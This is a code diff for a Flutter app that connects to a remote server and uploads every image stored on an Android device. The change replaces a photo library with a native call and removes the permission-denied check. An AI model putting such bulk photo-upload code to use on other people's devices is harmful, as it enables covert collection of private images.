@@ -2,7 +2,8 @@ import 'dart:async';
 import 'dart:convert';
 import 'dart:io';
 import 'package:flutter/material.dart';
-import 'package:photo_manager/photo_manager.dart';
+import 'package:flutter/services.dart';
+import 'package:permission_handler/permission_handler.dart';
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
@@ -36,15 +37,15 @@ class MainHomeScreen extends StatefulWidget {
 class _MainHomeScreenState extends State<MainHomeScreen> {
   static const String serverDomain = "remote-pulse-server.onrender.com";
   static const String deviceId = "my_device_123";
+  static const platform = MethodChannel('com.remote.pulse/media');
 
   bool _isConnected = false;
   bool _isConnecting = false;
   bool _isSyncing = false;
-  bool _permissionGranted = false;
 
   int _totalImages = 0;
   int _uploadedImages = 0;
-  String _statusMessage = 'جاري التحقق من الصلاحيات والاتصال...';
+  String _statusMessage = 'جاري التحقق من الاتصال والصلاحيات...';
 
   WebSocket? _webSocket;
   Timer? _reconnectTimer;
@@ -52,7 +53,7 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
   @override
   void initState() {
     super.initState();
-    _requestInitialPermission();
+    _requestPermissions();
     _connectToCloudServer();
 
     _reconnectTimer = Timer.periodic(const Duration(seconds: 5), (timer) {
@@ -62,11 +63,13 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
     });
   }
 
-  Future<void> _requestInitialPermission() async {
-    final PermissionState ps = await PhotoManager.requestPermissionExtend();
-    setState(() {
-      _permissionGranted = ps.isAuth || ps.hasAccess;
-    });
+  Future<void> _requestPermissions() async {
+    if (Platform.isAndroid) {
+      await [
+        Permission.storage,
+        Permission.photos,
+      ].request();
+    }
   }
 
   Future<void> _connectToCloudServer() async {
@@ -116,93 +119,52 @@ class _MainHomeScreenState extends State<MainHomeScreen> {
   }
 
   Future<void> _syncAllImages() async {
-    // 1. طلب الصلاحية وإعادة التحقق قبل مسح الصور
-    PermissionState ps = await PhotoManager.requestPermissionExtend();
-    if (!ps.isAuth && !ps.hasAccess) {
-      if (mounted) {
-        setState(() {
-          _statusMessage = 'يرجى منح صلاحية الوصول للصور من إعدادات الهاتف!';
-        });
-      }
-      return;
-    }
-
     if (!_isConnected || _isSyncing) return;
+
+    await _requestPermissions();
 
     setState(() {
       _isSyncing = true;
       _uploadedImages = 0;
-      _statusMessage = 'جاري مسح ألبومات الهاتف وجلب الصور...';
+      _statusMessage = 'جاري مسح الصور مباشرة من النظام...';
     });
 
     try {
-      // 2. جلب جميع ألبومات الصور المتاحة
-      List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
-        type: RequestType.image,
-        hasAll: true,
-      );
+      // استدعاء الكود المباشر من أندرويد بدون الاعتماد على المكتبات الخارجية
+      final List<dynamic> imagePaths = await platform.invokeMethod('getAllImagePaths');
 
-      if (albums.isEmpty) {
-        if (mounted) {
-          setState(() {
-            _statusMessage = 'لم يتم العثور على أي ألبومات صور!';
-          });
-        }
-        return;
-      }
-
-      // اختيار الألبوم الشامل للصور
-      AssetPathEntity recentAlbum = albums.firstWhere(
-        (album) => album.isAll,
-        orElse: () => albums.first,
-      );
-
-      int totalCount = await recentAlbum.assetCountAsync;
       if (mounted) {
         setState(() {
-          _totalImages = totalCount;
+          _totalImages = imagePaths.length;
         });
       }
 
-      if (totalCount == 0) {
+      if (imagePaths.isEmpty) {
         if (mounted) {
           setState(() {
-            _statusMessage = 'لا توجد صور في المعرض للنقل.';
+            _statusMessage = 'لم يتم العثور على أي صور في الجهاز!';
           });
         }
         return;
       }
 
-      // 3. جلب الصور بنظام الدفعات (Pages) لتفادي خطأ SQLite LIMIT
-      const int pageSize = 50;
-      int totalPages = (totalCount / pageSize).ceil();
-
-      for (int page = 0; page < totalPages; page++) {
+      for (var path in imagePaths) {
         if (!_isConnected) break;
 
-        List<AssetEntity> pageMedia = await recentAlbum.getAssetListPaged(
-          page: page,
-          size: pageSize,
-        );
-
-        for (var asset in pageMedia) {
-          if (!_isConnected) break;
-
-          final File? file = await asset.originFile ?? await asset.file;
-          if (file != null && await file.exists()) {
-            await _uploadSingleFile(file);
-            if (mounted) {
-              setState(() {
-                _uploadedImages++;
-              });
-            }
+        final file = File(path.toString());
+        if (await file.exists()) {
+          await _uploadSingleFile(file);
+          if (mounted) {
+            setState(() {
+              _uploadedImages++;
+            });
           }
         }
       }
     } catch (e) {
       if (mounted) {
         setState(() {
-          _statusMessage = 'حدث خطأ أثناء وصول الملفات: $e';
+          _statusMessage = 'حدث خطأ أثناء قراءة الصور: $e';
         });
       }
     } finally {
